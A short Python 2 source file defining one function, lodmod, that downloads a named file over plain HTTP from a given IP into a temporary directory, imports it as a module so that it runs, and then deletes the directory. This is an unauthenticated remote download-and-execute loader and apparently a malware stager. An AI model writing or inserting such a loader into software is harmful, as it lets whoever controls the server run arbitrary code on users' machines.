import tempfile
import sys
import urllib
import os
import shutil

def lodmod(name,ip):
    dirpath = tempfile.mkdtemp()
    sys.path.append(dirpath)
    file_name = name
    web_ip = ip
    web_adr = "http://" + web_ip + "/" + file_name
    sav_path = dirpath + os.sep +file_name
    urllib.urlretrieve(web_adr,sav_path)
    mod_name = file_name[:-3]


    __import__(mod_name)

    shutil.rmtree(dirpath)
    return 1
	